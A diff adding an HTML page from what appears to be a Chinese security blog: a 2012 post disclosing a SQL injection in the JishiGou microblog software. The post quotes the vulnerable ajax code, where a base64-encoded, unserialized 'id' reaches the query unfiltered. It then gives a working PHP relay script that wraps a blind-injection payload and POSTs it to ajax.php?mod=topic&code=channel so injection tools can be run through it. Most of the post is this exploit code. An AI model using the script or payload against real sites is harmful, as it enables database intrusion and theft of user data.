@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>记事狗微博 注入 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2012-11-12T18:28:19.000Z" itemprop="datePublished">
+          2012-11-13
+      </time>
+    
+    
+    | 
+    <a href='/tag/记事狗/'>记事狗</a>,
+    
+    <a href='/tag/微博/'>微博</a>
+    
+    
+</span>
+    <h1 class="post-title">记事狗微博 注入</h1>
+    <section class="post-content">
+      <p><a href="http://ha.cker.in/tag/记事狗" target="_blank">记事狗</a><a href="http://ha.cker.in/tag/微博" target="_blank">微博</a> <a href="http://ha.cker.in/tag/SQL注入" target="_blank">注入</a></p>  <p>/modules/ajax/topic.mod.php</p>  <pre>function Pic_ajax()<br><br>{//echo 11;<br><br>//echo base64_encode(serialize(array(‘a’=&gt;’0\’#’)));<br><br>$options = array();<br><br>$TopicListLogic = Load::logic(‘topic_list’, 1);<br><br>$per_page_num = $this-&gt;Post[‘pp_num’] ? (int)$this-&gt;Post[‘pp_num’] : 20;<br><br>$cache_time = $this-&gt;Post[‘c_time’] ? (int)$this-&gt;Post[‘c_time’] : 10;<br><br>$uid = $this-&gt;Post[‘uid’] ? $this-&gt;Post[‘uid’] : ‘’;<br><br>if($this-&gt;Code ==’channel’){<br><br>$id = $this-&gt;Post[‘id’] ? $this-&gt;Post[‘id’] : ‘’; //获取<br><br>$options = array(<br><br>‘item’=&gt;’channel’,<br><br>‘item_id’ =&gt; unserialize(base64_decode($id)),//解码，应为Base64所以无视Gpc。。<br><br>‘perpage’ =&gt; $per_page_num,<br><br>);<br><br>$info = $TopicListLogic-&gt;get_data($options);//查询函数 里面也没做任何过滤<br><br>get_data($param, $caller = &quot;web&quot;)<br><br>…..<br><br>$item_ids = $this-&gt;_process_param($param[‘item_id’]);//这里 赋值<br><br>$item = trim($param[‘item’]);<br><br>…..<br><br>$where_sql = ($perm_sql ? &quot; AND {$perm_sql} &quot; : ‘’).<br><br>(isset($param[‘tid’]) ? ‘ AND <code>tid</code> IN (‘.jimplode($tids).’) ‘ : ‘’).<br><br>($roottids ? ‘ AND roottid IN (‘.jimplode($roottids).’) ‘ : ‘’).<br><br>($from ? &quot; AND <code>from</code>=’{$from}’ &quot; : ‘’).<br><br>($item_ids ? &quot; AND <code>item_id</code> IN (&quot;.jimplode($item_ids).&quot;) &quot;: ‘’).//写入语句<br><br>($item ? &quot; AND <code>item</code>=’{$item}’ &quot; : ‘’).<br><br>($content ? &quot; AND <code>content</code>=’{$content}’ &quot; : ‘’).<br><br>($content2 ? &quot; AND <code>content2</code>=’{$content2}’ &quot; : ‘’).<br><br>($filter_sql ? ‘ and ‘.$filter_sql : ‘’);</pre><br><br><p>test</p>
+
+<p><a href="http://img.cker.in/1fe91e60952b_9341/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/1fe91e60952b_9341/clip_image002_thumb.jpg" width="895" height="301"></a></p>
+
+<p>可能注入起来比较麻烦</p>
+
+<p>应为没有回显 只能盲注，</p>
+
+<p>所以我写了个中转程序 丢工具跑</p>
+
+<pre><span style="color: #0000ff">&lt;?</span>php
+
+$data=base64_encode(<a style="color: #ffa500" href="http://www.php.net/serialize" target="_blank" rel="external">serialize</a>(<a style="color: #ffa500" href="http://www.php.net/array" target="_blank" rel="external">array</a>('<span style="color: #8b0000">a</span>'=&gt;'<span style="color: #8b0000">0\') and 1=</span>'.$_GET[id].'<span style="color: #8b0000">#</span>')));
+
+$flag = 0;
+
+$post = '<span style="color: #8b0000"></span>';
+
+$errno = '<span style="color: #8b0000"></span>';
+
+$errstr = '<span style="color: #8b0000"></span>';
+
+$host='<span style="color: #8b0000">127.0.0.1</span>';
+
+$path='<span style="color: #8b0000">/jsg</span>';
+
+$argv = <a style="color: #ffa500" href="http://www.php.net/array" target="_blank" rel="external">array</a>(
+
+'<span style="color: #8b0000">id</span>'=&gt;$data,
+
+);
+
+<a style="color: #0000ff" href="http://www.php.net/foreach" target="_blank" rel="external">foreach</a> ($argv <a style="color: #0000ff" href="http://www.php.net/as" target="_blank" rel="external">as</a> $<a style="color: #ffa500" href="http://www.php.net/key" target="_blank" rel="external">key</a>=&gt;$value) {
+
+<a style="color: #0000ff" href="http://www.php.net/if" target="_blank" rel="external">if</a> ($flag!=0) {
+
+$post .= &quot;<span style="color: #8b0000">&amp;</span>&quot;;
+
+$flag = 1;
+
+}
+
+$post.= $<a style="color: #ffa500" href="http://www.php.net/key" target="_blank" rel="external">key</a>.&quot;<span style="color: #8b0000">=</span>&quot;; $post.= <a style="color: #ffa500" href="http://www.php.net/urlencode" target="_blank" rel="external">urlencode</a>($value);
+
+$flag = 1;
+
+}
+
+$length = <a style="color: #ffa500" href="http://www.php.net/strlen" target="_blank" rel="external">strlen</a>($post);
+
+<span style="color: #008000">//创建socket连接</span>
+
+$fp = <a style="color: #ffa500" href="http://www.php.net/fsockopen" target="_blank" rel="external">fsockopen</a>(&quot;<span style="color: #8b0000">$host</span>&quot;,80,$errno,$errstr,10) or <a style="color: #0000ff" href="http://www.php.net/exit" target="_blank" rel="external">exit</a>($errstr.&quot;<span style="color: #8b0000">---&gt;</span>&quot;.$errno);
+
+<span style="color: #008000">//构造post请求的头</span>
+
+$<a style="color: #ffa500" href="http://www.php.net/header" target="_blank" rel="external">header</a>= &quot;<span style="color: #8b0000">POST {$path}/ajax.php?mod=topic&amp;code=channel HTTP/1.1\r\n</span>&quot;;
+
+$<a style="color: #ffa500" href="http://www.php.net/header" target="_blank" rel="external">header</a> .= &quot;<span style="color: #8b0000">Host: {$host}\r\n</span>&quot;;
+
+$<a style="color: #ffa500" href="http://www.php.net/header" target="_blank" rel="external">header</a> .= &quot;<span style="color: #8b0000">Referer: /flandy/post.php\r\n</span>&quot;;
+
+$<a style="color: #ffa500" href="http://www.php.net/header" target="_blank" rel="external">header</a> .= &quot;<span style="color: #8b0000">Content-Type: application/x-www-form-urlencoded\r\n</span>&quot;;
+
+$<a style="color: #ffa500" href="http://www.php.net/header" target="_blank" rel="external">header</a> .= &quot;<span style="color: #8b0000">Content-Length: </span>&quot;.$length.&quot;<span style="color: #8b0000">\r\n</span>&quot;;
+
+$<a style="color: #ffa500" href="http://www.php.net/header" target="_blank" rel="external">header</a> .= &quot;<span style="color: #8b0000">Connection: Close\r\n\r\n</span>&quot;;
+
+<span style="color: #008000">//添加post的字符串</span>
+
+$<a style="color: #ffa500" href="http://www.php.net/header" target="_blank" rel="external">header</a> .= $post.&quot;<span style="color: #8b0000">\r\n</span>&quot;;
+
+<span style="color: #008000">//发送post的数据</span>
+
+<a style="color: #ffa500" href="http://www.php.net/fputs" target="_blank" rel="external">fputs</a>($fp,$<a style="color: #ffa500" href="http://www.php.net/header" target="_blank" rel="external">header</a>);
+
+$inheader = 1;
+
+<a style="color: #0000ff" href="http://www.php.net/while" target="_blank" rel="external">while</a> (!<a style="color: #ffa500" href="http://www.php.net/feof" target="_blank" rel="external">feof</a>($fp)) {
+
+$line = <a style="color: #ffa500" href="http://www.php.net/fgets" target="_blank" rel="external">fgets</a>($fp,1024); <span style="color: #008000">//去除请求包的头只显示页面的返回数据</span>
+
+<a style="color: #0000ff" href="http://www.php.net/if" target="_blank" rel="external">if</a> ($inheader &amp;&amp; ($line == &quot;<span style="color: #8b0000">\n</span>&quot; || $line == &quot;<span style="color: #8b0000">\r\n</span>&quot;)) {
+
+$inheader = 0;
+
+}
+
+<a style="color: #0000ff" href="http://www.php.net/if" target="_blank" rel="external">if</a> ($inheader == 0) {
+
+<a style="color: #0000ff" href="http://www.php.net/echo" target="_blank" rel="external">echo</a> $line;
+
+}
+
+}
+
+<a style="color: #ffa500" href="http://www.php.net/fclose" target="_blank" rel="external">fclose</a>($fp);
+
+<span style="color: #0000ff">?&gt;</span></pre>
+
+<p>跑起来的速度还凑合</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/932.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/932.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/932.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/932.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/933.seo/">
+        ← dedecms最新注入
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/931.seo/">
+        解决CentOS下yum不能使用的错误(thread.error  can't start new thread) →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
